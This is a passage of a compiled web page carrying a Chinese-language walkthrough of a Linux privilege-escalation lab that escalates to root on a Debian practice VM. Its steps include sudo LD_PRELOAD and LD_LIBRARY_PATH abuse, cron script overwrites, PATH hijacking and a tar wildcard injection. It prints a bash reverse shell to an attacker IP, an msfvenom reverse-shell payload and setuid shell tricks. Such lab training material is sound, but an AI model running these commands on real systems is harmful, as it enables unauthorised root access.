\u9003\u9038\u5e8f\u5217\uff0c\u662f\u54ea\u4e00\u4e2a\uff1f"}),(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-plaintext",children:"apache2\n"})})]}),"\n",(0,l.jsx)(s.h2,{id:"sudo---\u73af\u5883\u53d8\u91cf",children:"Sudo - \u73af\u5883\u53d8\u91cf"}),"\n",(0,l.jsx)(s.p,{children:"sudo \u53ef\u4ee5\u914d\u7f6e\u4ee5\u7ee7\u627f\u7528\u6237\u73af\u5883\u4e2d\u7684\u67d0\u4e9b\u73af\u5883\u53d8\u91cf\u3002"}),"\n",(0,l.jsx)(s.p,{children:"\u68c0\u67e5\u54ea\u4e9b\u73af\u5883\u53d8\u91cf\u88ab\u7ee7\u627f\uff08\u5bfb\u627e env_keep \u9009\u9879\uff09\uff1a"}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"sudo -l\n"})}),"\n",(0,l.jsxs)(s.p,{children:[(0,l.jsx)(s.code,{children:"LD_PRELOAD"})," \u548c ",(0,l.jsx)(s.code,{children:"LD_LIBRARY_PATH"})," \u90fd\u662f\u4ece\u7528\u6237\u7684\u73af\u5883\u4e2d\u7ee7\u627f\u7684\u3002",(0,l.jsx)(s.code,{children:"LD_PRELOAD"})," \u5728\u8fd0\u884c\u7a0b\u5e8f\u65f6\u5728\u5176\u4ed6\u6240\u6709\u5171\u4eab\u5bf9\u8c61\u4e4b\u524d\u52a0\u8f7d\u4e00\u4e2a\u5171\u4eab\u5bf9\u8c61\u3002",(0,l.jsx)(s.code,{children:"LD_LIBRARY_PATH"})," \u63d0\u4f9b\u4e86\u5171\u4eab\u5e93\u9996\u5148\u641c\u7d22\u7684\u76ee\u5f55\u5217\u8868\u3002"]}),"\n",(0,l.jsxs)(s.p,{children:["\u4f7f\u7528\u4f4d\u4e8e ",(0,l.jsx)(s.code,{children:"/home/user/tools/sudo/preload.c"})," \u7684\u4ee3\u7801\u521b\u5efa\u4e00\u4e2a\u5171\u4eab\u5bf9\u8c61\uff1a"]}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c\n"})}),"\n",(0,l.jsxs)(s.p,{children:["\u8fd0\u884c\u4f60\u53ef\u4ee5\u901a\u8fc7 sudo \u8fd0\u884c\u7684\u7a0b\u5e8f\u4e4b\u4e00\uff08\u5728\u8fd0\u884c sudo -l \u65f6\u5217\u51fa\u7684\u7a0b\u5e8f\uff09\uff0c\u540c\u65f6\u5c06 ",(0,l.jsx)(s.code,{children:"LD_PRELOAD"})," \u73af\u5883\u53d8\u91cf\u8bbe\u7f6e\u4e3a\u65b0\u5171\u4eab\u5bf9\u8c61\u7684\u5b8c\u6574\u8def\u5f84\uff1a"]}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"sudo LD_PRELOAD=/tmp/preload.so program-name-here\n"})}),"\n",(0,l.jsx)(s.p,{children:"\u4e00\u4e2a root shell \u5e94\u8be5\u88ab\u751f\u6210\u3002\u5728\u7ee7\u7eed\u4e4b\u524d\u9000\u51fa\u8fd9\u4e2a shell\u3002\u6839\u636e\u4f60\u9009\u62e9\u7684\u7a0b\u5e8f\uff0c\u4f60\u53ef\u80fd\u9700\u8981\u9000\u51fa\u8fd9\u4e2a\u7a0b\u5e8f\u7684 shell\u3002"}),"\n",(0,l.jsxs)(s.p,{children:["\u8fd0\u884c ",(0,l.jsx)(s.code,{children:"ldd"})," \u547d\u4ee4\u6765\u67e5\u770b apache2 \u7a0b\u5e8f\u6587\u4ef6\u4f7f\u7528\u4e86\u54ea\u4e9b\u5171\u4eab\u5e93\uff1a"]}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"ldd /usr/sbin/apache2\n"})}),"\n",(0,l.jsxs)(s.p,{children:["\u4f7f\u7528\u4f4d\u4e8e ",(0,l.jsx)(s.code,{children:"/home/user/tools/sudo/library_path.c"})," \u7684\u4ee3\u7801\u521b\u5efa\u4e00\u4e2a\u4e0e\u5217\u8868\u4e2d\u67d0\u4e2a\u5e93\uff08\u6bd4\u5982 ",(0,l.jsx)(s.code,{children:"libcrypt.so.1"})," \uff09\u540c\u540d\u7684\u5171\u4eab\u5bf9\u8c61\uff1a"]}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c\n"})}),"\n",(0,l.jsxs)(s.p,{children:["\u4f7f\u7528 ",(0,l.jsx)(s.code,{children:"sudo"})," \u8fd0\u884c ",(0,l.jsx)(s.code,{children:"apache2"})," \uff0c\u540c\u65f6\u5c06 ",(0,l.jsx)(s.code,{children:"LD_LIBRARY_PATH"})," \u73af\u5883\u53d8\u91cf\u8bbe\u7f6e\u4e3a ",(0,l.jsx)(s.code,{children:"/tmp"}),"\uff08\u8fd9\u662f\u6211\u4eec\u8f93\u51fa\u7f16\u8bd1\u540e\u7684\u5171\u4eab\u5bf9\u8c61\u7684\u5730\u65b9\uff09\uff1a"]}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"sudo LD_LIBRARY_PATH=/tmp apache2\n"})}),"\n",(0,l.jsxs)(s.p,{children:["\u4e00\u4e2a root shell \u5e94\u8be5\u88ab\u751f\u6210\u3002\u9000\u51fa\u8fd9\u4e2a shell\u3002\u5c1d\u8bd5\u5c06 ",(0,l.jsx)(s.code,{children:"/tmp/libcrypt.so.1"})," \u91cd\u547d\u540d\u4e3a ",(0,l.jsx)(s.code,{children:"apache2"})," \u4f7f\u7528\u7684\u53e6\u4e00\u4e2a\u5e93\u7684\u540d\u79f0\uff0c\u7136\u540e\u518d\u6b21\u4f7f\u7528 ",(0,l.jsx)(s.code,{children:"sudo"})," \u8fd0\u884c ",(0,l.jsx)(s.code,{children:"apache2"})," \u3002\u5b83\u80fd\u591f\u5de5\u4f5c\u5417\uff1f\u5982\u679c\u4e0d\u80fd\uff0c\u8bf7\u5c1d\u8bd5\u627e\u51fa\u539f\u56e0\uff0c\u4ee5\u53ca\u5982\u4f55\u66f4\u6539 ",(0,l.jsx)(s.code,{children:"library_path.c"})," \u4ee3\u7801\u4f7f\u5176\u80fd\u591f\u5de5\u4f5c\u3002"]}),"\n",(0,l.jsx)(s.p,{children:"\u8bb0\u5f97\u5728\u7ee7\u7eed\u4e4b\u524d\u9000\u51fa root shell\uff01"}),"\n",(0,l.jsx)(s.h2,{id:"\u5b9a\u65f6\u4efb\u52a1---\u6587\u4ef6\u6743\u9650",children:"\u5b9a\u65f6\u4efb\u52a1 - \u6587\u4ef6\u6743\u9650"}),"\n",(0,l.jsxs)(s.p,{children:["Cron \u4efb\u52a1\u662f\u7528\u6237\u53ef\u4ee5\u5b89\u6392\u5728\u7279\u5b9a\u65f6\u95f4\u6216\u95f4\u9694\u8fd0\u884c\u7684\u7a0b\u5e8f\u6216\u811a\u672c\u3002Cron \u8868\u6587\u4ef6\uff08crontabs\uff09\u5b58\u50a8\u4e86 cron \u4efb\u52a1\u7684\u914d\u7f6e\u3002\u7cfb\u7edf\u8303\u56f4\u7684 crontab \u4f4d\u4e8e ",(0,l.jsx)(s.code,{children:"/etc/crontab"})," \u3002"]}),"\n",(0,l.jsx)(s.p,{children:"\u67e5\u770b\u7cfb\u7edf\u8303\u56f4\u7684 crontab \u5185\u5bb9\uff1a"}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"cat /etc/crontab\n"})}),"\n",(0,l.jsxs)(s.p,{children:["\u5e94\u8be5\u6709\u4e24\u4e2a cron \u4efb\u52a1\u88ab\u5b89\u6392\u5728\u6bcf\u5206\u949f\u8fd0\u884c\u4e00\u6b21\u3002\u4e00\u4e2a\u8fd0\u884c ",(0,l.jsx)(s.code,{children:"overwrite.sh"})," \uff0c\u53e6\u4e00\u4e2a\u8fd0\u884c ",(0,l.jsx)(s.code,{children:"/usr/local/bin/compress.sh"})," \u3002"]}),"\n",(0,l.jsxs)(s.p,{children:["\u5b9a\u4f4d ",(0,l.jsx)(s.code,{children:"overwrite.sh"})," \u6587\u4ef6\u7684\u5b8c\u6574\u8def\u5f84\uff1a"]}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"locate overwrite.sh\n"})}),"\n",(0,l.jsx)(s.p,{children:"\u8bf7\u6ce8\u610f\uff0c\u8be5\u6587\u4ef6\u662f\u53ef\u88ab\u6240\u6709\u7528\u6237\u5199\u5165\u7684\u3002"}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"ls -l /usr/local/bin/overwrite.sh\n"})}),"\n",(0,l.jsxs)(s.p,{children:["\u5c06 ",(0,l.jsx)(s.code,{children:"overwrite.sh"})," \u6587\u4ef6\u7684\u5185\u5bb9\u66ff\u6362\u4e3a\u4ee5\u4e0b\u5185\u5bb9\uff0c\u5c06\u5176\u4e2d\u7684 IP \u5730\u5740\u66f4\u6539\u4e3a\u60a8 Kali \u7cfb\u7edf\u7684 IP \u5730\u5740\u540e\uff1a"]}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"#!/bin/bash\nbash -i >& /dev/tcp/10.10.10.10/4444 0>&1\n"})}),"\n",(0,l.jsx)(s.p,{children:"\u5728\u60a8\u7684 Kali \u7cfb\u7edf\u4e0a\u7684\u7aef\u53e3 4444 \u4e0a\u8bbe\u7f6e\u4e00\u4e2a netcat \u76d1\u542c\u5668\uff0c\u5e76\u7b49\u5f85 cron \u4efb\u52a1\u8fd0\u884c\uff08\u4e0d\u5e94\u8d85\u8fc7\u4e00\u5206\u949f\uff09\u3002\u4e00\u4e2a root shell \u5e94\u8be5\u4f1a\u8fde\u63a5\u56de\u60a8\u7684 netcat \u76d1\u542c\u5668\u3002\u5982\u679c\u6ca1\u6709\u8fde\u63a5\u56de\u6765\uff0c\u8bf7\u91cd\u65b0\u68c0\u67e5\u6587\u4ef6\u7684\u6743\u9650\uff0c\u770b\u662f\u5426\u6709\u4ec0\u4e48\u9057\u6f0f\uff1f"}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"nc -nvlp 4444\n"})}),"\n",(0,l.jsx)(s.p,{children:"\u8bf7\u8bb0\u5f97\u5728\u7ee7\u7eed\u4e4b\u524d\u9000\u51fa root shell \u5e76\u79fb\u9664\u53cd\u5411 shell \u4ee3\u7801\uff01"}),"\n",(0,l.jsx)(s.h2,{id:"\u5b9a\u65f6\u4efb\u52a1---path-\u73af\u5883\u53d8\u91cf",children:"\u5b9a\u65f6\u4efb\u52a1 - PATH \u73af\u5883\u53d8\u91cf"}),"\n",(0,l.jsx)(s.p,{children:"\u67e5\u770b\u7cfb\u7edf\u8303\u56f4\u7684 crontab \u5185\u5bb9\uff1a"}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"cat /etc/crontab\n"})}),"\n",(0,l.jsxs)(s.p,{children:["\u8bf7\u6ce8\u610f\uff0cPATH \u53d8\u91cf\u4ee5 ",(0,l.jsx)(s.code,{children:"/home/user"})," \u5f00\u5934\uff0c\u8fd9\u662f\u6211\u4eec\u7528\u6237\u7684\u4e3b\u76ee\u5f55\u3002"]}),"\n",(0,l.jsxs)(s.p,{children:["\u5728\u60a8\u7684\u4e3b\u76ee\u5f55\u4e0b\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a ",(0,l.jsx)(s.code,{children:"overwrite.sh"})," \u7684\u6587\u4ef6\uff0c\u5e76\u6dfb\u52a0\u4ee5\u4e0b\u5185\u5bb9\uff1a"]}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"#!/bin/bash\n\ncp /bin/bash /tmp/rootbash\nchmod +xs /tmp/rootbash\n"})}),"\n",(0,l.jsx)(s.p,{children:"\u786e\u4fdd\u8be5\u6587\u4ef6\u662f\u53ef\u6267\u884c\u7684\uff1a"}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"chmod +x /home/user/overwrite.sh\n"})}),"\n",(0,l.jsxs)(s.p,{children:["\u7b49\u5f85 cron \u4efb\u52a1\u8fd0\u884c\uff08\u4e0d\u5e94\u8d85\u8fc7\u4e00\u5206\u949f\uff09\u3002\u4f7f\u7528 -p \u53c2\u6570\u8fd0\u884c ",(0,l.jsx)(s.code,{children:"/tmp/rootbash"})," \u547d\u4ee4\uff0c\u4ee5\u83b7\u53d6\u4ee5 root \u6743\u9650\u8fd0\u884c\u7684 shell\u3002"]}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"/tmp/rootbash -p\n"})}),"\n",(0,l.jsxs)(s.p,{children:["\u8bb0\u5f97\u5728\u7ee7\u7eed\u4e4b\u524d\u79fb\u9664\u4fee\u6539\u8fc7\u7684\u4ee3\u7801\uff0c\u5220\u9664 ",(0,l.jsx)(s.code,{children:"/tmp/rootbash"})," \u53ef\u6267\u884c\u6587\u4ef6\uff0c\u5e76\u9000\u51fa\u63d0\u5347\u6743\u9650\u7684 shell\uff0c\u56e0\u4e3a\u60a8\u7a0d\u540e\u4f1a\u518d\u6b21\u521b\u5efa\u8fd9\u4e2a\u6587\u4ef6\uff01"]}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"rm /tmp/rootbash\nexit\n"})}),"\n",(0,l.jsxs)(s.admonition,{title:"Answer the questions below",type:"info",children:[(0,l.jsxs)(s.p,{children:[(0,l.jsx)(s.code,{children:"/etc/crontab"})," \u6587\u4ef6\u4e2d\u7684 PATH \u53d8\u91cf\u7684\u503c\u662f\u4ec0\u4e48\uff1f"]}),(0,l.jsxs)(n,{children:[(0,l.jsx)("summary",{children:" \u5177\u4f53\u64cd\u4f5c\u6b65\u9aa4 "}),(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"$ cat /etc/crontab\n# /etc/crontab: system-wide crontab\n# Unlike any other crontab you don't have to run the `crontab'\n# command to install the new version when you edit this file\n# and files in /etc/cron.d. These files also have username fields,\n# that none of the other crontabs do.\n\nSHELL=/bin/sh\nPATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n# m h dom mon dow user  command\n17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly\n25 6    * * *   root    test -x /usr/sbin/anacron || (cd / && run-parts --report /etc/cron.daily)\n47 6    * * 7   root    test -x /usr/sbin/anacron || (cd / && run-parts --report /etc/cron.weekly)\n52 6    1 * *   root    test -x /usr/sbin/anacron || (cd / && run-parts --report /etc/cron.monthly)\n#\n* * * * * root overwrite.sh\n* * * * * root /usr/local/bin/compress.sh\n"})})]}),(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-plaintext",children:"/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n"})})]}),"\n",(0,l.jsx)(s.h2,{id:"\u5b9a\u65f6\u4efb\u52a1---\u901a\u914d\u7b26",children:"\u5b9a\u65f6\u4efb\u52a1 - \u901a\u914d\u7b26"}),"\n",(0,l.jsx)(s.p,{children:"\u67e5\u770b\u5176\u4ed6\u8ba1\u5212\u4efb\u52a1\u811a\u672c\u7684\u5185\u5bb9:"}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"cat /usr/local/bin/compress.sh\n"})}),"\n",(0,l.jsx)(s.p,{children:"\u8bf7\u6ce8\u610f\uff0ctar \u547d\u4ee4\u5728\u60a8\u7684\u4e3b\u76ee\u5f55\u4e2d\u4f7f\u7528\u4e86\u901a\u914d\u7b26 (*)\u3002"}),"\n",(0,l.jsxs)(s.p,{children:["\u67e5\u770b GTFOBins \u9875\u9762\u4e0a\u5173\u4e8e ",(0,l.jsx)(s.a,{href:"https://gtfobins.github.io/gtfobins/tar/",children:"tar"})," \u7684\u4fe1\u606f\u3002\u8bf7\u6ce8\u610f\uff0ctar \u5177\u6709\u547d\u4ee4\u884c\u9009\u9879\uff0c\u53ef\u4ee5\u4f5c\u4e3a\u68c0\u67e5\u70b9\u529f\u80fd\u7684\u4e00\u90e8\u5206\u8fd0\u884c\u5176\u4ed6\u547d\u4ee4\u3002"]}),"\n",(0,l.jsxs)(s.p,{children:["\u5728\u60a8\u7684 Kali \u7cfb\u7edf\u4e0a\u4f7f\u7528 ",(0,l.jsx)(s.code,{children:"msfvenom"})," \u751f\u6210\u4e00\u4e2a\u53cd\u5411 shell ELF \u4e8c\u8fdb\u5236\u6587\u4ef6\u3002\u6839\u636e\u9700\u8981\u66f4\u65b0 ",(0,l.jsx)(s.code,{children:"LHOST IP"})," \u5730\u5740\uff1a"]}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf\n"})}),"\n",(0,l.jsxs)(s.p,{children:["\u5c06 ",(0,l.jsx)(s.code,{children:"shell.elf"})," \u6587\u4ef6\u4f20\u8f93\u5230 Debian \u865a\u62df\u673a\u4e0a\u7684 ",(0,l.jsx)(s.code,{children:"/home/user/"})," \u76ee\u5f55\uff08\u60a8\u53ef\u4ee5\u4f7f\u7528 scp \u6216\u8005\u5728 Kali \u7cfb\u7edf\u4e0a\u6258\u7ba1\u6587\u4ef6\u5e76\u4f7f\u7528 wget\uff09\u3002\u786e\u4fdd\u6587\u4ef6\u5177\u6709\u53ef\u6267\u884c\u6743\u9650\uff1a"]}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"chmod +x /home/user/shell.elf\n"})}),"\n",(0,l.jsxs)(s.p,{children:["\u5728 ",(0,l.jsx)(s.code,{children:"/home/user"})," \u76ee\u5f55\u4e0b\u521b\u5efa\u8fd9\u4e24\u4e2a\u6587\u4ef6"]}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"touch /home/user/--checkpoint=1\ntouch /home/user/--checkpoint-action=exec=shell.elf\n"})}),"\n",(0,l.jsx)(s.p,{children:"\u5f53 cron \u4f5c\u4e1a\u4e2d\u7684 tar \u547d\u4ee4\u8fd0\u884c\u65f6\uff0c\u901a\u914d\u7b26\uff08*\uff09\u5c06\u4f1a\u6269\u5c55\u4ee5\u5305\u62ec\u8fd9\u4e9b\u6587\u4ef6\u3002\u7531\u4e8e\u5b83\u4eec\u7684\u6587\u4ef6\u540d\u662f\u6709\u6548\u7684 tar \u547d\u4ee4\u884c\u9009\u9879\uff0ctar \u4f1a\u5c06\u5b83\u4eec\u8bc6\u522b\u4e3a\u9009\u9879\u800c\u4e0d\u662f\u6587\u4ef6\u540d\u3002"}),"\n",(0,l.jsx)(s.p,{children:"\u5728\u60a8\u7684 Kali \u7cfb\u7edf\u4e0a\u7684\u7aef\u53e3 4444 \u4e0a\u8bbe\u7f6e\u4e00\u4e2a netcat \u76d1\u542c\u5668\uff0c\u5e76\u7b49\u5f85 cron \u4f5c\u4e1a\u8fd0\u884c\uff08\u4e0d\u5e94\u8be5\u8d85\u8fc7\u4e00\u5206\u949f\uff09\u3002\u4e00\u4e2a root shell \u5e94\u8be5\u4f1a\u8fde\u63a5\u56de\u60a8\u7684 netcat \u76d1\u542c\u5668\u3002"}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"nc -nvlp 4444\n"})}),"\n",(0,l.jsx)(s.p,{children:"\u8bb0\u5f97\u9000\u51fa root shell \u5e76\u5220\u9664\u60a8\u521b\u5efa\u7684\u6240\u6709\u6587\u4ef6\uff0c\u4ee5\u9632\u6b62 cron \u4f5c\u4e1a\u518d\u6b21\u6267\u884c\uff1a"}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"rm /home/user/shell.elf\nrm /home/user/--checkpoint=1\nrm /home/user/--checkpoint-action=exec=shell.elf\n"})}),"\n",(0,l.jsx)(s.h2,{id:"suid--sgid-\u53ef\u6267\u884c\u6587\u4ef6---\u5df2\u77e5\u6f0f\u6d1e",children:"SUID / SGID \u53ef\u6267\u884c\u6587\u4ef6 - \u5df2\u77e5\u6f0f\u6d1e"}),"\n",(0,l.jsx)(s.p,{children:"\u627e\u5230 Debian \u865a\u62df\u673a\u4e0a\u6240\u6709\u7684 SUID/SGID \u53ef\u6267\u884c\u6587\u4ef6\uff1a"}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"find / -type f -a \\(-perm -u+s -o -perm -g+s \\) -exec ls -l {} \\; 2> /dev/null\n"})}),"\n",(0,l.jsxs)(s.p,{children:["\u8bf7\u6ce8\u610f\uff0c\u7ed3\u679c\u4e2d\u51fa\u73b0\u4e86 ",(0,l.jsx)(s.code,{children:"/usr/sbin/exim-4.84-3"})," \u3002\u5c1d\u8bd5\u627e\u5230\u9488\u5bf9\u8fd9\u4e2a\u7248\u672c exim \u7684\u5df2\u77e5\u6f0f\u6d1e\u3002",(0,l.jsx)(s.code,{children:"Exploit-DB"})," \u3001",(0,l.jsx)(s.code,{children:"Google"})," \u548c ",(0,l.jsx)(s.code,{children:"GitHub"})," \u90fd\u662f\u641c\u7d22\u7684\u597d\u53bb\u5904\uff01"]}),"\n",(0,l.jsxs)(s.p,{children:["\u5e94\u8be5\u53ef\u4ee5\u627e\u5230\u4e00\u4e2a\u4e0e\u8fd9\u4e2a exim \u7248\u672c\u5b8c\u5168\u5339\u914d\u7684\u672c\u5730\u7279\u6743\u5347\u7ea7\u6f0f\u6d1e\u5229\u7528\u3002\u5728 Debian \u865a\u62df\u673a\u4e0a\u7684 ",(0,l.jsx)(s.code,{children:"/home/user/tools/suid/exim/cve-2016-1531.sh"})," \u8def\u5f84\u4e0b\u53ef\u4ee5\u627e\u5230\u4e00\u4efd\u526f\u672c\u3002"]}),"\n",(0,l.jsx)(s.p,{children:"\u8fd0\u884c\u8fd9\u4e2a\u6f0f\u6d1e\u5229\u7528\u811a\u672c\u4ee5\u83b7\u5f97\u4e00\u4e2a root shell\uff1a"}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"/home/user/tools/suid/exim/cve-2016-1531.sh\n"})}),"\n",(0,l.jsx)(s.p,{children:"\u5728\u7ee7\u7eed\u4e4b\u524d\u8bb0\u5f97\u9000\u51fa root shell\uff01"}),"\n",(0,l.jsx)(s.h2,{id:"suid--sgid-\u53ef\u6267\u884c\u6587\u4ef6---\u5171\u4eab\u5bf9\u8c61\u6ce8\u5165",children:"SUID / SGID \u53ef\u6267\u884c\u6587\u4ef6 - \u5171\u4eab\u5bf9\u8c61\u6ce8\u5165"}),"\n",(0,l.jsxs)(s.p,{children:[(0,l.jsx)(s.code,{children:"/usr/local/bin/suid-so"})," \u7684 SUID \u53ef\u6267\u884c\u6587\u4ef6\u5bb9\u6613\u53d7\u5230\u5171\u4eab\u5bf9\u8c61\u6ce8\u5165\u653b\u51fb\u3002"]}),"\n",(0,l.jsx)(s.p,{children:"\u9996\u5148\uff0c\u6267\u884c\u8be5\u6587\u4ef6\uff0c\u5e76\u6ce8\u610f\u76ee\u524d\u5b83\u5728\u9000\u51fa\u524d\u663e\u793a\u4e00\u4e2a\u8fdb\u5ea6\u6761\uff1a"}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"/usr/local/bin/suid-so\n"})}),"\n",(0,l.jsxs)(s.p,{children:["\u8fd0\u884c ",(0,l.jsx)(s.code,{children:"strace"})," \u547d\u4ee4\u6765\u8ddf\u8e2a\u8be5\u6587\u4ef6\uff0c\u5e76\u5728\u8f93\u51fa\u4e2d\u641c\u7d22 ",(0,l.jsx)(s.code,{children:"open/access"})," \u8c03\u7528\u548c ",(0,l.jsx)(s.code,{children:"no such file"})," \u9519\u8bef\uff1a"]}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:'strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"\n'})}),"\n",(0,l.jsxs)(s.p,{children:["\u6ce8\u610f\u5230\u53ef\u6267\u884c\u6587\u4ef6\u8bd5\u56fe\u52a0\u8f7d\u4f4d\u4e8e\u6211\u4eec\u5bb6\u76ee\u5f55\u4e0b\u7684 ",(0,l.jsx)(s.code,{children:"/home/user/.config/libcalc.so"})," \u5171\u4eab\u5bf9\u8c61\uff0c\u4f46\u672a\u627e\u5230\u3002"]}),"\n",(0,l.jsxs)(s.p,{children:["\u4e3a ",(0,l.jsx)(s.code,{children:"libcalc.so"})," \u6587\u4ef6\u521b\u5efa ",(0,l.jsx)(s.code,{children:".config"})," \u76ee\u5f55\uff1a"]}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"mkdir /home/user/.config\n"})}),"\n",(0,l.jsxs)(s.p,{children:["\u793a\u4f8b\u5171\u4eab\u5bf9\u8c61\u4ee3\u7801\u4f4d\u4e8e ",(0,l.jsx)(s.code,{children:"/home/user/tools/suid/libcalc.c"})," \u3002\u5b83\u7b80\u5355\u5730\u751f\u6210\u4e00\u4e2a ",(0,l.jsx)(s.code,{children:"Bash shell"})," \u3002\u5c06\u4ee3\u7801\u7f16\u8bd1\u6210\u4e00\u4e2a\u5171\u4eab\u5bf9\u8c61\uff0c\u653e\u7f6e\u5230 ",(0,l.jsx)(s.code,{children:"suid-so"})," \u53ef\u6267\u884c\u6587\u4ef6\u5bfb\u627e\u7684\u4f4d\u7f6e\uff1a"]}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c\n"})}),"\n",(0,l.jsxs)(s.p,{children:["\u518d\u6b21\u6267\u884c ",(0,l.jsx)(s.code,{children:"suid-so"})," \u53ef\u6267\u884c\u6587\u4ef6\uff0c\u6ce8\u610f\u8fd9\u6b21\u4e0d\u518d\u663e\u793a\u8fdb\u5ea6\u6761\uff0c\u800c\u662f\u5f97\u5230\u4e86\u4e00\u4e2a root shell\u3002"]}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"/usr/local/bin/suid-so\n"})}),"\n",(0,l.jsx)(s.p,{children:"\u5728\u7ee7\u7eed\u4e4b\u524d\u8bb0\u5f97\u9000\u51fa root shell\uff01"}),"\n",(0,l.jsx)(s.h2,{id:"suid--sgid-\u53ef\u6267\u884c\u6587\u4ef6---\u73af\u5883\u53d8\u91cf",children:"SUID / SGID \u53ef\u6267\u884c\u6587\u4ef6 - \u73af\u5883\u53d8\u91cf"}),"\n",(0,l.jsxs)(s.p,{children:["\u53ef\u6267\u884c\u6587\u4ef6 ",(0,l.jsx)(s.code,{children:"/usr/local/bin/suid-env"})," \u5b58\u5728\u6f0f\u6d1e\uff0c\u56e0\u4e3a\u5b83\u7ee7\u627f\u4e86\u7528\u6237\u7684 ",(0,l.jsx)(s.code,{children:"PATH"})," \u73af\u5883\u53d8\u91cf\uff0c\u5e76\u5c1d\u8bd5\u6267\u884c\u7a0b\u5e8f\u800c\u672a\u6307\u5b9a\u7edd\u5bf9\u8def\u5f84\u3002"]}),"\n",(0,l.jsxs)(s.p,{children:["\u9996\u5148\uff0c\u6267\u884c\u8be5\u6587\u4ef6\u5e76\u6ce8\u610f\u5230\u5b83\u4f3c\u4e4e\u5c1d\u8bd5\u542f\u52a8 ",(0,l.jsx)(s.code,{children:"apache2"})," web \u670d\u52a1\u5668\uff1a"]}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"/usr/local/bin/suid-env\n"})}),"\n",(0,l.jsxs)(s.p,{children:["\u5bf9\u8be5\u6587\u4ef6\u8fd0\u884c ",(0,l.jsx)(s.code,{children:"strings"})," \u547d\u4ee4\u4ee5\u67e5\u627e\u53ef\u6253\u5370\u5b57\u7b26\u7684\u5b57\u7b26\u4e32\uff1a"]}),"\n",(0,l.jsx)(s.pre,{children:(0,l.jsx)(s.code,{className:"language-shell",children:"strings /usr/local/bin/suid-env\n"})}),"\n",(0,l.jsxs)(s.p,{children:["\u4e00\u884c\u4ee3\u7801 (",(0,l.jsx)(s.code,{children:"service apache2 start"}),") \u6697\u793a\u7740\u6b63\u5728\u8c03\u7528 ",(0,l.jsx)(s.code,{children:"service"})," \u53ef\u6267\u884c\u6587\u4ef6\u6765\u542f\u52a8 web \u670d\u52a1\u5668\uff0c\u7136\u800c\u5e76\u672a\u4f7f\u7528\u53ef\u6267\u884c\u6587\u4ef6\u7684\u5b8c\u6574\u8def\u5f84 ( ",(0,l.jsx)(s.code,{children:"/usr/sbin/service"})," )\u3002"]}),"\n",(0,l.jsxs)(s.p,{children:["\u5c06\u4f4d\u4e8e ",(0,l.jsx)(s.code,{children:"/home/user/tools/suid/service.c"})," \u7684\u4ee3\u7801\u7f16\u8bd1\u6210\u4e00\u4e2a\u540d\u4e3a ",(0,l.jsx)(s.code,{children:"service"})," \u7684\u53ef\u6267\u884c\u6587\u4ef6\u3002\u8be5\u4ee3\u7801\u7b80\u5355\u5730\u751f\u6210\u4e00\u4e2a Bash 